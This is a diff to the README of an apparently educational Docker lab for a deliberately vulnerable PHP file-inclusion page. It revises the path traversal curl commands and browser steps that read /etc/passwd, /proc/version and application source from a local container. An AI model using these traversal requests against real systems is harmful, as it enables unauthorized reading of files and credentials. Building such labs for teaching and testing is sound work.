@@ -72,11 +72,18 @@ This should display the content of `about.php` from the `includes/` directory.
 
 ### Step 3: Try Path Traversal
 
-Attempt to read the `README_FILES.txt` file using path traversal:
+Attempt to read files using path traversal. Note that in the container, files are located at `/var/www/html/`, so path traversal works relative to the `includes/` directory:
 
 ```bash
-curl "http://127.0.0.1:8080/vulnerable.php?page=../../templates/includes/README_FILES.txt"
+# Read README_FILES.txt directly (no traversal needed)
+curl "http://127.0.0.1:8080/vulnerable.php?page=README_FILES.txt"
+
+# Read application source code using path traversal (go up one level from includes/)
+curl "http://127.0.0.1:8080/vulnerable.php?page=../index.php"
+curl "http://127.0.0.1:8080/vulnerable.php?page=../vulnerable.php"
 ```
+
+**Note**: The container structure is flat (files are copied directly to `/var/www/html/`), so `../../templates/includes/README_FILES.txt` won't work because there's no `templates/` directory in the container. Use `../` to go up one level from the `includes/` directory to access files in the web root.
 
 ### Step 3b: Read Container/System Files (DEMO ONLY)
 
@@ -123,39 +130,51 @@ curl http://127.0.0.1:8080/vulnerable.php?page=help.php
 Try different path traversal techniques:
 
 ```bash
-# Using relative paths
+# Using relative paths to access system files (go up from includes/, then up from web root)
 curl "http://127.0.0.1:8080/vulnerable.php?page=../../etc/passwd"
 
-# Using absolute paths (direct access)
+# Using absolute paths (direct access - recommended for system files)
 curl "http://127.0.0.1:8080/vulnerable.php?page=/etc/passwd"
 
-# Reading application source code
-curl "http://127.0.0.1:8080/vulnerable.php?page=../../index.php"
-curl "http://127.0.0.1:8080/vulnerable.php?page=../../vulnerable.php"
+# Reading application source code (go up one level from includes/ to web root)
+curl "http://127.0.0.1:8080/vulnerable.php?page=../index.php"
+curl "http://127.0.0.1:8080/vulnerable.php?page=../vulnerable.php"
+
+# Access files in includes/ directory
+curl "http://127.0.0.1:8080/vulnerable.php?page=about.php"
+curl "http://127.0.0.1:8080/vulnerable.php?page=README_FILES.txt"
 ```
+
+**Container Structure Note**: In the container, files are located at:
+- `/var/www/html/` - Web root (contains `index.php`, `vulnerable.php`)
+- `/var/www/html/includes/` - Includes directory (contains `about.php`, `contact.php`, `help.php`, `README_FILES.txt`)
+
+Path traversal from `includes/` using `../` goes up to `/var/www/html/`, allowing access to application files. Using `../../` goes up to `/var/www/`, which can then access system directories like `/etc/`.
 
 ## Browser-Based Demo
 
 1. Navigate to `http://127.0.0.1:8080` in your browser
 2. Click on the "About", "Contact", or "Help" links
-3. Try entering different file names in the form (e.g., `about.php`, `contact.php`)
-4. Attempt path traversal: `../../templates/includes/README_FILES.txt`
-5. **DEMO ONLY**: Try reading container files:
+3. Try entering different file names in the form (e.g., `about.php`, `contact.php`, `README_FILES.txt`)
+4. Attempt path traversal to access application files:
+   - `../index.php` - Access the homepage source
+   - `../vulnerable.php` - Access the vulnerable handler source
+5. **DEMO ONLY**: Try reading container files using absolute paths:
    - `/etc/passwd` - Container user database
    - `/etc/hostname` - Container hostname
    - `/proc/version` - Kernel version
    - `/etc/os-release` - OS information
-6. Try a non-existent file to see the error handling
+6. Try a non-existent file to see the error handling (e.g., `nonexistent.php`)
 
 ## Project Structure
 
+**Local Development Structure:**
 ```
 .
 ├── README.md                 # This file
 ├── docker-compose.yml        # Docker Compose configuration
 ├── Dockerfile               # Docker image definition
 ├── demo_commands.txt        # Exact commands for reproduction
-├── screenshot_samples.txt   # Suggested screenshots for reports
 └── templates/
     ├── index.php            # Homepage with navigation
     ├── vulnerable.php       # The vulnerable file inclusion handler
@@ -165,6 +184,20 @@ curl "http://127.0.0.1:8080/vulnerable.php?page=../../vulnerable.php"
         ├── help.php         # Demo file: Help page
         └── README_FILES.txt # List of available demo files
 ```
+
+**Container Structure (after Docker build):**
+```
+/var/www/html/
+├── index.php                # Homepage
+├── vulnerable.php           # Vulnerable handler
+└── includes/
+    ├── about.php
+    ├── contact.php
+    ├── help.php
+    └── README_FILES.txt
+```
+
+**Note**: The Dockerfile copies `templates/` contents directly to `/var/www/html/`, so the `templates/` directory structure doesn't exist in the container. This is why path traversal like `../../templates/includes/README_FILES.txt` won't work - use `../` to go up one level from `includes/` to access files in the web root.
 
 ## The Vulnerability
 
